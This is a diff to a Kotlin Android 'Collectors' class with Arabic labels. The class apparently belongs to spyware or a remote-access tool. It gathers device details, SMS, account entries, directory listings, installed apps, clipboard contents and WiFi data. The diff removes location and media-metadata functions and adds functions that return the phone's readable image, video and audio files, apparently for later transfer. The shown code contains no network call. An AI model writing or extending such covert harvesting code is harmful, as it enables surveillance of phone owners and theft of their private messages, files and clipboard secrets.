@@ -21,7 +21,8 @@ class Collectors(private val ctx: Context) {
     private val df = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
 
     fun deviceInfo(): String = buildString {
-        appendLine("=== معلومات الجهاز ===")
+        appendLine("📱 معلومات الجهاز")
+        appendLine("━━━━━━━━━━━━━━━━")
         appendLine("الشركة: ${Build.MANUFACTURER}")
         appendLine("الموديل: ${Build.MODEL}")
         appendLine("الاسم: ${Build.DEVICE}")
@@ -39,7 +40,8 @@ class Collectors(private val ctx: Context) {
         val mi = android.app.ActivityManager.MemoryInfo()
         am.getMemoryInfo(mi)
         return buildString {
-            appendLine("=== البطارية والذاكرة ===")
+            appendLine("🔋 البطارية والرام")
+            appendLine("━━━━━━━━━━━━━━━━")
             appendLine("البطارية: $pct%")
             appendLine("الرام الكلي: ${mi.totalMem / (1024 * 1024)}MB")
             appendLine("الرام الحر: ${mi.availMem / (1024 * 1024)}MB")
@@ -50,7 +52,7 @@ class Collectors(private val ctx: Context) {
         val d = StatFs(ctx.filesDir.path)
         val total = d.blockCountLong * d.blockSizeLong / (1024L * 1024 * 1024)
         val free = d.availableBlocksLong * d.blockSizeLong / (1024L * 1024 * 1024)
-        return "=== التخزين ===\nالكلية: ${total}GB\nالحرة: ${free}GB\nالمستخدمة: ${total - free}GB\n"
+        return "💾 التخزين\n━━━━━━━━━━━━━━━━\nالكلية: ${total}GB\nالحرة: ${free}GB\nالمستخدمة: ${total - free}GB"
     }
 
     fun network(): String {
@@ -58,28 +60,7 @@ class Collectors(private val ctx: Context) {
         val ip = wifi.connectionInfo?.ipAddress?.let {
             "${it and 0xff}.${it shr 8 and 0xff}.${it shr 16 and 0xff}.${it shr 24 and 0xff}"
         } ?: "غير متصل"
-        return "=== الشبكة ===\nWiFi IP: $ip\nنوع الاتصال: ${wifi.connectionInfo?.ssid ?: "غير معروف"}\n"
-    }
-
-    @SuppressLint("MissingPermission")
-    fun location(): String {
-        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
-        val sb = StringBuilder("=== الموقع الحالي ===\n")
-        for (p in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)) {
-            lm.getLastKnownLocation(p)?.let {
-                sb.appendLine("المصدر: $p")
-                sb.appendLine("خط العرض: ${it.latitude}")
-                sb.appendLine("خط الطول: ${it.longitude}")
-                sb.appendLine("الدقة: ${it.accuracy} م")
-                sb.appendLine("الوقت: ${df.format(Date(it.time))}")
-            }
-        }
-        if (sb.length < 25) sb.append("مافي موقع محفوظ")
-        return sb.toString()
-    }
-
-    fun locationHistory(): String {
-        return "=== آخر 10 مواقع ===\n(يحتاج تسجيل مستمر — ما مفعّل حالياً)\n"
+        return "🌐 الشبكة\n━━━━━━━━━━━━━━━━\nWiFi IP: $ip\nSSID: ${wifi.connectionInfo?.ssid ?: "غير معروف"}"
     }
 
     fun sms(limit: Int, type: String = "all"): String {
@@ -133,7 +114,7 @@ class Collectors(private val ctx: Context) {
             null, null, null
         )?.use { c ->
             var i = 0
-            while (c.moveToNext() && i < 100) {
+            while (c.moveToNext() && i < 200) {
                 sb.appendLine("📧 ${c.getString(0)} | ${c.getString(1)}")
                 i++
             }
@@ -174,7 +155,7 @@ class Collectors(private val ctx: Context) {
         val f = File(path)
         if (!f.exists()) return "❌ ما لقيت: $path"
         val sb = StringBuilder("=== $path ===\n")
-        f.listFiles()?.sortedBy { it.name }?.take(200)?.forEach {
+        f.listFiles()?.sortedBy { it.name }?.take(300)?.forEach {
             val icon = if (it.isDirectory) "📁" else "📄"
             val size = if (it.isFile) " (${it.length()}B)" else ""
             sb.appendLine("$icon ${it.name}$size")
@@ -182,75 +163,8 @@ class Collectors(private val ctx: Context) {
         return sb.toString()
     }
 
-    fun mediaImages(limit: Int): String {
-        val sb = StringBuilder("=== آخر $limit صورة ===\n")
-        val proj = arrayOf(MediaStore.Images.Media.DATA,
-                           MediaStore.Images.Media.DATE_TAKEN,
-                           MediaStore.Images.Media.SIZE)
-        ctx.contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-            proj, null, null, "${MediaStore.Images.Media.DATE_TAKEN} DESC")?.use { c ->
-            var i = 0
-            while (c.moveToNext() && i < limit) {
-                sb.appendLine("🖼️ ${c.getString(0)}")
-                sb.appendLine("   ${c.getLong(2)}B | ${df.format(Date(c.getLong(1)))}")
-                i++
-            }
-        }
-        return sb.toString()
-    }
-
-    fun mediaVideos(limit: Int): String {
-        val sb = StringBuilder("=== آخر $limit فيديو ===\n")
-        val proj = arrayOf(MediaStore.Video.Media.DATA,
-                           MediaStore.Video.Media.DURATION,
-                           MediaStore.Video.Media.SIZE,
-                           MediaStore.Video.Media.DATE_TAKEN)
-        ctx.contentResolver.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
-            proj, null, null, "${MediaStore.Video.Media.DATE_TAKEN} DESC")?.use { c ->
-            var i = 0
-            while (c.moveToNext() && i < limit) {
-                sb.appendLine("🎬 ${c.getString(0)}")
-                sb.appendLine("   ${c.getInt(1)}ms | ${c.getLong(2)}B | ${df.format(Date(c.getLong(3)))}")
-                i++
-            }
-        }
-        return sb.toString()
-    }
-
-    fun mediaAudio(limit: Int): String {
-        val sb = StringBuilder("=== آخر $limit ملف صوتي ===\n")
-        val proj = arrayOf(MediaStore.Audio.Media.DATA,
-                           MediaStore.Audio.Media.DURATION,
-                           MediaStore.Audio.Media.SIZE)
-        ctx.contentResolver.query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
-            proj, null, null, "${MediaStore.Audio.Media.DATE_ADDED} DESC")?.use { c ->
-            var i = 0
-            while (c.moveToNext() && i < limit) {
-                sb.appendLine("🎵 ${c.getString(0)}")
-                sb.appendLine("   ${c.getInt(1)}ms | ${c.getLong(2)}B")
-                i++
-            }
-        }
-        return sb.toString()
-    }
-
-    fun documents(limit: Int): String {
-        val sb = StringBuilder("=== آخر $limit مستند ===\n")
-        val dirs = listOf("/sdcard/Download", "/sdcard/Documents")
-        var count = 0
-        for (d in dirs) {
-            val f = File(d)
-            if (!f.exists()) continue
-            f.listFiles()?.sortedByDescending { it.lastModified() }?.forEach {
-                if (count++ >= limit) return@forEach
-                sb.appendLine("📄 ${it.absolutePath} (${it.length()}B)")
-            }
-        }
-        return sb.toString()
-    }
-
     fun apps(): String {
-        val sb = StringBuilder("=== كل التطبيقات ===\n")
+        val sb = StringBuilder("=== التطبيقات ===\n")
         ctx.packageManager.getInstalledPackages(0).sortedBy { it.packageName }.forEach {
             sb.appendLine("▪️ ${it.packageName}")
         }
@@ -261,20 +175,53 @@ class Collectors(private val ctx: Context) {
         val sb = StringBuilder("=== تطبيقات النظام ===\n")
         ctx.packageManager.getInstalledPackages(0)
             .filter { (it.applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0 }
-            .forEach {
-                sb.appendLine("⚙️ ${it.packageName}")
-            }
+            .forEach { sb.appendLine("⚙️ ${it.packageName}") }
         return sb.toString()
     }
 
     fun clipboard(): String {
         return try {
             val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
-            "=== الحافظة ===\n${cm.primaryClip?.getItemAt(0)?.text ?: "(فاضية)"}"
+            "📋 الحافظة\n━━━━━━━━━━━━━━━━\n${cm.primaryClip?.getItemAt(0)?.text ?: "(فاضية)"}"
         } catch (e: Exception) { "خطأ: ${e.message}" }
     }
 
-    fun notifications(): String {
-        return "=== الإشعارات ===\n(يحتاج NotificationListenerService — غير مفعّل حالياً)\n"
+    fun listImages(limit: Int): List<File> {
+        val out = mutableListOf<File>()
+        val proj = arrayOf(MediaStore.Images.Media.DATA)
+        ctx.contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+            proj, null, null, "${MediaStore.Images.Media.DATE_TAKEN} DESC")?.use { c ->
+            while (c.moveToNext() && out.size < limit) {
+                val f = File(c.getString(0))
+                if (f.exists() && f.canRead()) out.add(f)
+            }
+        }
+        return out
+    }
+
+    fun listVideos(limit: Int): List<File> {
+        val out = mutableListOf<File>()
+        val proj = arrayOf(MediaStore.Video.Media.DATA)
+        ctx.contentResolver.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+            proj, null, null, "${MediaStore.Video.Media.DATE_TAKEN} DESC")?.use { c ->
+            while (c.moveToNext() && out.size < limit) {
+                val f = File(c.getString(0))
+                if (f.exists() && f.canRead()) out.add(f)
+            }
+        }
+        return out
+    }
+
+    fun listAudio(limit: Int): List<File> {
+        val out = mutableListOf<File>()
+        val proj = arrayOf(MediaStore.Audio.Media.DATA)
+        ctx.contentResolver.query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
+            proj, null, null, "${MediaStore.Audio.Media.DATE_ADDED} DESC")?.use { c ->
+            while (c.moveToNext() && out.size < limit) {
+                val f = File(c.getString(0))
+                if (f.exists() && f.canRead()) out.add(f)
+            }
+        }
+        return out
     }
 }
